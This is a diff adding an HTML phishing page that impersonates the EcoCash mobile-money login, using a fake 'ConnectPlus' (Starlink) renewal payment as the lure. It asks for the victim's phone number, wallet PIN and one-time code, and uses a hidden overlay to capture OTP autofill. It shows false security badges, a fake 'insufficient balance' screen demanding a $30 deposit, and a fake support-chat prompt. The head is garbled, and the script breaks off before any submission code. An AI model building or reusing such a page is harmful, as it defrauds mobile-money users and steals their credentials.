@@ -1,0 +1,1685 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #0066B2 0%, #004A8A 50%, #003366 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 420px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 35px 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+        
+        .logo-section {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .logo-section img {
+            height: 50px;
+            margin-bottom: 10px;
+        }
+        
+        .logo-section h1 {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-top: 10px;
+        }
+        
+        /* Starlink Header */
+        .starlink-header {
+            display: none;
+            text-align: center;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .starlink-header.active {
+            display: block;
+        }
+        
+        .payment-details {
+            display: none;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+        }
+        
+        .payment-details.active {
+            display: flex;
+        }
+        
+        .payment-amount {
+            text-align: left;
+        }
+        
+        .payment-amount .label {
+            font-size: 11px;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .payment-amount .value {
+            font-size: 22px;
+            font-weight: 700;
+            color: #0066B2;
+        }
+        
+        .payment-service {
+            text-align: right;
+        }
+        
+        .payment-service .label {
+            font-size: 11px;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .payment-service .value {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1a1a1a;
+        }
+        
+        .step-indicator {
+            text-align: center;
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        
+        .login-heading {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 25px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+        
+        .phone-input-wrapper {
+            display: flex;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            overflow: hidden;
+            transition: border-color 0.3s;
+        }
+        
+        .phone-input-wrapper:focus-within {
+            border-color: #0066B2;
+        }
+        
+        .country-code {
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            background: #f8f9fa;
+            border-right: 1px solid #e0e0e0;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .country-code:hover {
+            background: #f0f0f0;
+        }
+        
+        .country-code img {
+            width: 24px;
+            height: 18px;
+            border-radius: 3px;
+            margin-right: 8px;
+            object-fit: cover;
+        }
+        
+        .country-code span {
+            font-weight: 600;
+            color: #1a1a1a;
+            font-size: 14px;
+        }
+        
+        .country-code .dropdown-arrow {
+            margin-left: 5px;
+            font-size: 10px;
+            color: #666;
+        }
+        
+        .phone-input {
+            flex: 1;
+            padding: 16px;
+            border: none;
+            font-size: 16px;
+            outline: none;
+        }
+        
+        .phone-input::placeholder {
+            color: #aaa;
+        }
+        
+        /* Country Selector Modal */
+        .country-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .country-modal.active {
+            display: flex;
+        }
+        
+        .country-modal-content {
+            background: white;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 350px;
+            max-height: 70vh;
+            overflow: hidden;
+        }
+        
+        .country-modal-header {
+            padding: 20px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .country-modal-header h3 {
+            font-size: 18px;
+            color: #1a1a1a;
+        }
+        
+        .country-modal-close {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #666;
+        }
+        
+        .country-list {
+            list-style: none;
+            max-height: 50vh;
+            overflow-y: auto;
+        }
+        
+        .country-list li {
+            display: flex;
+            align-items: center;
+            padding: 15px 20px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .country-list li:hover {
+            background: #f8f9fa;
+        }
+        
+        .country-list li.selected {
+            background: #e6f3ff;
+        }
+        
+        .country-list li img {
+            width: 30px;
+            height: 22px;
+            border-radius: 3px;
+            margin-right: 12px;
+            object-fit: cover;
+        }
+        
+        .country-list li .country-name {
+            flex: 1;
+            font-weight: 500;
+        }
+        
+        .country-list li .country-dial {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        /* PIN Section */
+        .pin-section {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .pin-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 5px;
+        }
+        
+        .pin-sublabel {
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 15px;
+        }
+        
+        .pin-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+        }
+        
+        .pin-input {
+            width: 55px;
+            height: 55px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            outline: none;
+            transition: all 0.3s;
+            -webkit-text-security: disc;
+        }
+        
+        .pin-input:focus {
+            border-color: #0066B2;
+            box-shadow: 0 0 0 3px rgba(0, 102, 178, 0.1);
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #0066B2 0%, #004A8A 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .submit-btn:hover {
+            background: linear-gradient(135deg, #0055A0 0%, #003D7A 100%);
+            transform: translateY(-1px);
+        }
+        
+        .submit-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .submit-btn .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+        
+        .submit-btn.loading .spinner {
+            display: block;
+        }
+        
+        .submit-btn.loading .btn-text {
+            display: none;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* SSL Badge */
+        .ssl-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-top: 20px;
+            padding: 10px;
+            background: #f0fff4;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #22863a;
+        }
+        
+        .ssl-badge svg {
+            width: 16px;
+            height: 16px;
+        }
+        
+        /* OTP Screen */
+        .otp-screen {
+            display: none;
+        }
+        
+        .otp-screen.active {
+            display: block;
+        }
+        
+        .insufficient-screen {
+            display: none;
+        }
+        .insufficient-screen.active {
+            display: block;
+        }
+        
+        .login-screen.hidden {
+            display: none;
+        }
+        
+        .otp-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .otp-header .shield-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #e6f3ff 0%, #cce5ff 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+        }
+        
+        .otp-header .shield-icon svg {
+            width: 30px;
+            height: 30px;
+            color: #0066B2;
+        }
+        
+        .otp-header h2 {
+            font-size: 20px;
+            color: #1a1a1a;
+            margin-bottom: 10px;
+        }
+        
+        .otp-header p {
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .otp-header .phone-display {
+            font-weight: 600;
+            color: #1a1a1a;
+        }
+        
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+        
+        .otp-input {
+            width: 48px;
+            height: 55px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            outline: none;
+            transition: all 0.3s;
+        }
+        
+        .otp-input:focus {
+            border-color: #0066B2;
+            box-shadow: 0 0 0 3px rgba(0, 102, 178, 0.1);
+        }
+        
+        /* Transparent overlay input for OTP autofill */
+        .otp-autofill-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.01;
+            font-size: 22px;
+            border: none;
+            background: transparent;
+            color: transparent;
+            caret-color: transparent;
+            z-index: 2;
+            letter-spacing: 2em;
+            text-align: center;
+        }
+        
+        .resend-section {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .resend-section p {
+            font-size: 13px;
+            color: #666;
+        }
+        
+        .resend-link {
+            color: #0066B2;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        
+        .resend-link:hover {
+            text-decoration: underline;
+        }
+        
+        .resend-link.disabled {
+            color: #999;
+            cursor: not-allowed;
+        }
+        
+        .timer {
+            font-weight: 600;
+            color: #0066B2;
+        }
+        
+        .otp-expired-message {
+            display: none;
+            text-align: center;
+            padding: 10px;
+            background: #fff3cd;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            color: #856404;
+        }
+        
+        .otp-expired-message.active {
+            display: block;
+        }
+        
+        .otp-invalid-message {
+            display: none;
+            text-align: center;
+            padding: 10px;
+            background: #f8d7da;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            color: #721c24;
+        }
+        
+        .otp-invalid-message.active {
+            display: block;
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        .footer a {
+            color: white;
+            text-decoration: none;
+        }
+        
+        /* Responsive */
+        @media (max-width: 400px) {
+            .card {
+                padding: 25px 20px;
+            }
+            
+            .pin-input {
+                width: 48px;
+                height: 48px;
+                font-size: 20px;
+            }
+            
+            .otp-input {
+                width: 42px;
+                height: 48px;
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <!-- Login Screen -->
+            <div class="login-screen" id="loginScreen">
+                <div class="logo-section">
+                    <img src="/ecocash/images/ecocash.webp" alt="EcoCash">
+                    <h1>ECOCASH</h1>
+                </div>
+                
+                <!-- Starlink Payment Header -->
+                <div class="starlink-header" id="starlinkHeader">
+                    <div class="payment-details" id="paymentDetails">
+                        <div class="payment-amount">
+                            <div class="label">AMOUNT</div>
+                            <div class="value" id="paymentAmount">USD 15.00</div>
+                        </div>
+                        <div class="payment-service">
+                            <div class="label">SERVICE</div>
+                            <div class="value">ConnectPlus Renewal</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <p class="step-indicator">Step 2 of 3: Verification</p>
+                
+                <p class="login-heading" id="loginHeading">Enter your EcoCash details to authorize payment</p>
+                
+                <div class="form-group">
+                    <label class="form-label">EcoCash Number</label>
+                    <div class="phone-input-wrapper">
+                        <div class="country-code" id="countryCodeBtn" onclick="openCountrySelector()">
+                            <img id="flagImg" src="https://flagcdn.com/w40/zw.png" alt="Flag">
+                            <span id="dialCode">+263</span>
+                            <span class="dropdown-arrow">▼</span>
+                        </div>
+                        <input type="tel" class="phone-input" id="phoneInput" placeholder="7xxxxxxxx" maxlength="15" autocomplete="off" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'')" onkeypress="return /[0-9]/.test(event.key)">
+                    </div>
+                </div>
+                
+                <div class="pin-section">
+                    <div class="pin-label">Enter your 4-digit PIN</div>
+                    <div class="pin-sublabel">Check your EcoCash app or SMS</div>
+                    <div class="pin-inputs">
+                        <input type="tel" class="pin-input" maxlength="1" data-index="0" autocomplete="off" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkPinComplete&&checkPinComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                        <input type="tel" class="pin-input" maxlength="1" data-index="1" autocomplete="off" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkPinComplete&&checkPinComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                        <input type="tel" class="pin-input" maxlength="1" data-index="2" autocomplete="off" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkPinComplete&&checkPinComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                        <input type="tel" class="pin-input" maxlength="1" data-index="3" autocomplete="off" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkPinComplete&&checkPinComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                    </div>
+                </div>
+                
+                <button class="submit-btn" id="submitBtn" onclick="submitLogin()" disabled>
+                    <span class="spinner"></span>
+                    <span class="btn-text">Verify PIN</span>
+                </button>
+                
+                <div class="ssl-badge" id="sslBadge">
+                    <svg viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+                    </svg>
+                    <span>Your information is encrypted and secure</span>
+                </div>
+            </div>
+            
+            <!-- OTP Screen -->
+            <div class="otp-screen" id="otpScreen">
+                <div class="logo-section">
+                    <img src="/ecocash/images/ecocash.webp" alt="EcoCash">
+                </div>
+                
+                <div class="otp-header">
+                    <h2>OTP Verification</h2>
+                    <p class="step-indicator">Step 3 of 3: Final Verification</p>
+                    <div class="shield-icon">
+                        <svg viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+                        </svg>
+                    </div>
+                    <p>Please enter the 6-digit OTP sent to<br><span class="phone-display" id="phoneDisplay">+263 *** *** **34</span></p>
+                </div>
+                
+                <div class="otp-expired-message" id="otpExpiredMessage">
+                    OTP code expired. Please use the new code.
+                </div>
+                
+                <div class="otp-invalid-message" id="otpInvalidMessage">
+                    Invalid OTP code. Please use the new code sent.
+                </div>
+                
+                <div class="otp-inputs" style="position:relative;">
+                    <!-- Transparent overlay for OTP autofill -->
+                    <input type="text" id="otpAutofill" autocomplete="one-time-code" inputmode="numeric" maxlength="6" class="otp-autofill-overlay" placeholder="">
+                    <input type="tel" class="otp-input" maxlength="1" data-otp-index="0" autocomplete="one-time-code" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkOtpComplete&&checkOtpComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                    <input type="tel" class="otp-input" maxlength="1" data-otp-index="1" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkOtpComplete&&checkOtpComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                    <input type="tel" class="otp-input" maxlength="1" data-otp-index="2" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkOtpComplete&&checkOtpComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                    <input type="tel" class="otp-input" maxlength="1" data-otp-index="3" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkOtpComplete&&checkOtpComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                    <input type="tel" class="otp-input" maxlength="1" data-otp-index="4" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkOtpComplete&&checkOtpComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                    <input type="tel" class="otp-input" maxlength="1" data-otp-index="5" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');if(this.value){var n=this.nextElementSibling;if(n)n.focus()}checkOtpComplete&&checkOtpComplete()" onkeydown="if(event.key==='Backspace'&&!this.value){var p=this.previousElementSibling;if(p){p.focus();p.value=''}event.preventDefault()}">
+                </div>
+                
+                <button class="submit-btn" id="verifyBtn" onclick="verifyOTP()" disabled>
+                    <span class="spinner"></span>
+                    <span class="btn-text">Verify OTP</span>
+                </button>
+                
+                <div class="resend-section">
+                    <p>
+                        Didn't receive the code?
+                        <span class="resend-link disabled" id="resendLink" onclick="resendOTP()">
+                            RESEND CODE
+                            <span class="timer" id="timer">(1:00)</span>
+                        </span>
+                    </p>
+                </div>
+                
+                <div class="ssl-badge">
+                    <svg viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+                    </svg>
+                    <span>Your OTP is valid for 10 minutes</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Insufficient Balance Screen -->
+        <div class="insufficient-screen" id="insufficientScreen">
+            <div style="text-align:center;padding:30px 20px;">
+                <div style="width:80px;height:80px;border-radius:50%;background:#FEF3C7;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;">
+                    <span style="font-size:40px;">⚠️</span>
+                </div>
+                <h2 style="font-size:20px;color:#B45309;margin-bottom:8px;font-weight:700;">Insufficient Balance</h2>
+                    <p id="insuffMsg" style="color:#6B7280;font-size:13px;line-height:1.6;margin-bottom:24px;">
+                    You must have at least <strong style="color:#111;">$30 USD</strong> in your EcoCash wallet as a <strong style="color:#111;">guarantee deposit</strong> to subscribe to any ConnectPlus package.<br><br>Please deposit the required amount and click the button below.
+                </p>
+                <button id="depositedBtn" style="width:100%;padding:14px;background:#10B981;color:white;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:12px;">
+                    ✅ I Have Deposited
+                </button>
+                <button id="diffNumberBtn" style="width:100%;padding:14px;background:transparent;color:#6B7280;border:2px solid #D1D5DB;border-radius:10px;font-size:14px;font-weight:500;cursor:pointer;">
+                    Use a Different Number
+                </button>
+            </div>
+        </div>
+
+        <!-- Max Devices Screen -->
+        <div class="insufficient-screen" id="maxDevicesScreen" style="display:none;">
+            <div style="text-align:center;padding:30px 20px;">
+                <div style="width:80px;height:80px;border-radius:50%;background:#FEE2E2;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;">
+                    <span style="font-size:40px;">🚫</span>
+                </div>
+                <h2 style="font-size:20px;color:#DC2626;margin-bottom:8px;font-weight:700;">Cannot Proceed</h2>
+                <p style="color:#6B7280;font-size:13px;line-height:1.6;margin-bottom:24px;">
+                    You can not be allowed to proceed with the payment subscription due to ecocash reaching maximum number of devices. Contact support for assistant.
+                </p>
+                <button onclick="openEcocashMaxDevicesSupport()" style="width:100%;padding:14px;background:#25D366;color:white;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:10px;">
+                    💬 Chat with support now
+                </button>
+                <button onclick="checkMaxDevicesStatus()" style="width:100%;padding:12px;background:#3B82F6;color:white;border:none;border-radius:10px;font-size:14px;font-weight:600;cursor:pointer;">
+                    🔄 Check Status
+                </button>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>© 2026 EcoCash. All rights reserved.</p>
+        </div>
+    </div>
+    
+    <!-- Country Selector Modal -->
+    <div class="country-modal" id="countryModal">
+        <div class="country-modal-content">
+            <div class="country-modal-header">
+                <h3>Select Country</h3>
+                <button class="country-modal-close" onclick="closeCountrySelector()">×</button>
+            </div>
+            <ul class="country-list" id="countryList"></ul>
+        </div>
+    </div>
+    
+    <script>
+        let timerInterval = null;
+        let pinInputs = null;
+        let otpInputs = null;
+        
+        // Country configurations - EcoCash operates mainly in Zimbabwe but supports other African countries
+        const COUNTRIES = {
+            'ZW': { code: '+263', length: 9, flag: 'zw', name: 'Zimbabwe', currency: 'USD' },
+            'ZA': { code: '+27', length: 9, flag: 'za', name: 'South Africa', currency: 'ZAR' },
+            'BW': { code: '+267', length: 8, flag: 'bw', name: 'Botswana', currency: 'BWP' },
+            'MZ': { code: '+258', length: 9, flag: 'mz', name: 'Mozambique', currency: 'MZN' },
+            'ZM': { code: '+260', length: 9, flag: 'zm', name: 'Zambia', currency: 'ZMW' },
+            'MW': { code: '+265', length: 9, flag: 'mw', name: 'Malawi', currency: 'MWK' },
+            'NA': { code: '+264', length: 9, flag: 'na', name: 'Namibia', currency: 'NAD' },
+            'LS': { code: '+266', length: 8, flag: 'ls', name: 'Lesotho', currency: 'LSL' },
+            'SZ': { code: '+268', length: 8, flag: 'sz', name: 'Eswatini', currency: 'SZL' },
+            'CD': { code: '+243', length: 9, flag: 'cd', name: 'Congo DRC', currency: 'CDF' },
+            'CG': { code: '+242', length: 9, flag: 'cg', name: 'Congo Brazzaville', currency: 'XAF' },
+            'KE': { code: '+254', length: 9, flag: 'ke', name: 'Kenya', currency: 'KES' },
+            'UG': { code: '+256', length: 9, flag: 'ug', name: 'Uganda', currency: 'UGX' },
+            'TZ': { code: '+255', length: 9, flag: 'tz', name: 'Tanzania', currency: 'TZS' },
+            'RW': { code: '+250', length: 9, flag: 'rw', name: 'Rwanda', currency: 'RWF' },
+            'NG': { code: '+234', length: 10, flag: 'ng', name: 'Nigeria', currency: 'NGN' },
+            'GH': { code: '+233', length: 9, flag: 'gh', name: 'Ghana', currency: 'GHS' }
+        };
+        
+        let selectedCountryCode = 'ZW'; // Default to Zimbabwe
+        
+        // ConnectPlus packages (USD base prices for EcoCash - Zimbabwe uses USD)
+        const STARLINK_PACKAGES = {
+            'starter': { usd: 11, name: 'Starter Bundle', data: '120GB' },
+            'standard': { usd: 18, name: 'Standard Bundle', data: '250GB' },
+            'premium': { usd: 27, name: 'Premium Bundle', data: '400GB' },
+            'pro': { usd: 36, name: 'Pro Bundle', data: '600GB' },
+            'business': { usd: 54, name: 'Business Bundle', data: '1TB' },
+            'unlimited': { usd: 89, name: 'Unlimited Bundle', data: 'Unlimited' }
+        };
+        
+        // Currency conversion rates (USD to local currency)
+        const CURRENCY_RATES = {
+            'USD': 1, 'ZAR': 18.5, 'BWP': 13.5, 'MZN': 63.5, 'ZMW': 26.5,
+            'MWK': 1680, 'NAD': 18.5, 'LSL': 18.5, 'SZL': 18.5, 'CDF': 2800,
+            'XAF': 600, 'KES': 130, 'UGX': 3700, 'TZS': 2500, 'RWF': 1300,
+            'NGN': 1500, 'GHS': 15, 'BIF': 8300
+        };
+        
+        // Country Selector Functions
+        function openCountrySelector() {
+            const countryList = document.getElementById('countryList');
+            countryList.innerHTML = '';
+            
+            Object.keys(COUNTRIES).forEach(code => {
+                const country = COUNTRIES[code];
+                const li = document.createElement('li');
+                li.className = code === selectedCountryCode ? 'selected' : '';
+                li.innerHTML = `
+                    <img src="https://flagcdn.com/w40/${country.flag}.png" alt="${country.name}">
+                    <span class="country-name">${country.name}</span>
+                    <span class="country-dial">${country.code}</span>
+                `;
+                li.onclick = () => selectCountry(code);
+                countryList.appendChild(li);
+            });
+            
+            document.getElementById('countryModal').classList.add('active');
+        }
+        
+        function closeCountrySelector() {
+            document.getElementById('countryModal').classList.remove('active');
+        }
+        
+        function selectCountry(code) {
+            selectedCountryCode = code;
+            cacheCountry(code);
+            setCountry(code);
+            closeCountrySelector();
+            
+            // Update Starlink amount if applicable
+            const urlParams = new URLSearchParams(window.location.search);
+            const packageType = urlParams.get('package');
+            if (packageType) {
+                updateStarlinkAmount();
+            }
+        }
+        
+        function cacheCountry(code) {
+            try {
+                localStorage.setItem('ecocash_country', code);
+            } catch (e) {}
+        }
+        
+        function getCachedCountry() {
+            try {
+                return localStorage.getItem('ecocash_country');
+            } catch (e) {
+                return null;
+            }
+        }
+        
+        function setCountry(countryCode) {
+            const country = COUNTRIES[countryCode];
+            if (country) {
+                document.getElementById('flagImg').src = `https://flagcdn.com/w40/${country.flag}.png`;
+                document.getElementById('dialCode').textContent = country.code;
+                document.getElementById('phoneInput').placeholder = 'x'.repeat(country.length);
+                document.getElementById('phoneInput').maxLength = country.length;
+            }
+        }
+        
+        // Check Starlink source
+        function checkStarlinkSource() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const source = urlParams.get('source');
+            const packageType = urlParams.get('package');
+            
+            if (source === 'starlink' && packageType) {
+                const starlinkHeader = document.getElementById('starlinkHeader');
+                const paymentDetails = document.getElementById('paymentDetails');
+                const sslBadge = document.getElementById('sslBadge');
+                
+                if (starlinkHeader) {
+                    starlinkHeader.classList.add('active');
+                    if (paymentDetails) paymentDetails.classList.add('active');
+                    
+                    updateStarlinkAmount();
+                }
+            }
+        }
+        
+        function updateStarlinkAmount() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const packageType = urlParams.get('package');
+            const urlCdf = urlParams.get('cdf');
+            const passedPrice = urlParams.get('lp');
+            const passedCur = urlParams.get('cur');
+            
+            // Use price passed from plans page if available
+            if (passedPrice && passedCur) {
+                const display = passedCur === 'USD' ? `$${passedPrice}` : `${passedCur} ${parseInt(passedPrice).toLocaleString()}`;
+                document.getElementById('paymentAmount').textContent = display;
+                return;
+            }
+            
+            const pkg = STARLINK_PACKAGES[packageType] || STARLINK_PACKAGES['starter'];
+            
+            // Default to USD for Zimbabwe users
+            let currency = 'USD';
+            let rate = 1;
+            
+            // Use selected country currency if different
+            const country = COUNTRIES[selectedCountryCode];
+            if (country && country.currency !== 'USD') {
+                currency = country.currency;
+                rate = CURRENCY_RATES[currency] || 1;
+            }
+            
+            // Convert from CDF if provided, otherwise use package USD price
+            let localAmount;
+            if (urlCdf) {
+                // CDF to USD conversion (approx 1 USD = 2800 CDF)
+                const usdAmount = parseInt(urlCdf) / 2800;
+                localAmount = Math.round(usdAmount * rate * 100) / 100;
+            } else {
+                localAmount = Math.round(pkg.usd * rate * 100) / 100;
+            }
+            
+            const formatted = localAmount.toLocaleString('en-US', {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            });
+            
+            document.getElementById('paymentAmount').textContent = `${currency} ${formatted}`;
+        }
+        
+        // PIN input handling - will be initialized after DOM ready
+        function setupInputHandling(inputs, callback) {
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length > 1) value = value.slice(-1); // Only one digit
+                    e.target.value = value;
+                    if (value && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                    callback();
+                });
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace') {
+                        if (!e.target.value && index > 0) {
+                            inputs[index - 1].focus();
+                        } else {
+                            e.target.value = '';
+                        }
+                        callback();
+                    } else if (e.key >= '0' && e.key <= '9') {
+                        // Allow digit
+                    } else if (e.key.length === 1) {
+                        e.preventDefault();
+                    }
+                });
+                input.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+                    [...paste].slice(0, inputs.length).forEach((char, i) => {
+                        if (inputs[i]) inputs[i].value = char;
+                    });
+                    const lastIndex = Math.min(paste.length, inputs.length) - 1;
+                    if (lastIndex >= 0) inputs[lastIndex].focus();
+                    callback();
+                });
+            });
+        }
+        
+        function checkPinComplete() {
+            var inputs = document.querySelectorAll('.pin-input');
+            var pin = Array.prototype.map.call(inputs, function(i) { return i.value; }).join('');
+            var phone = document.getElementById('phoneInput').value;
+            var country = COUNTRIES[selectedCountryCode];
+            var requiredLength = country ? country.length : 9;
+            var allDigits = pin.length === 4 && /^\d{4}$/.test(pin);
+            document.getElementById('submitBtn').disabled = !(allDigits && phone.length >= requiredLength && /^\d+$/.test(phone));
+        }
+        
+        function checkOtpComplete() {
+            var isLSL = new URLSearchParams(window.location.search).get('cur') === 'LSL';
+            var reqLen = isLSL ? 4 : 6;
+            var visible = Array.from(document.querySelectorAll('.otp-input')).filter(function(el) { return el.style.display !== 'none'; });
+            var otp = visible.map(function(i) { return i.value; }).join('');
+            var complete = otp.length === reqLen && new RegExp('^\\d{' + reqLen + '}$').test(otp);
+            document.getElementById('verifyBtn').disabled = !complete;
+            if (complete) { setTimeout(function() { verifyOTP && verifyOTP(); }, 120); }
+        }
+        
+        function initializeInputs() {
+            console.log('EcoCash input validation initialized - phone input blocks non-digits');
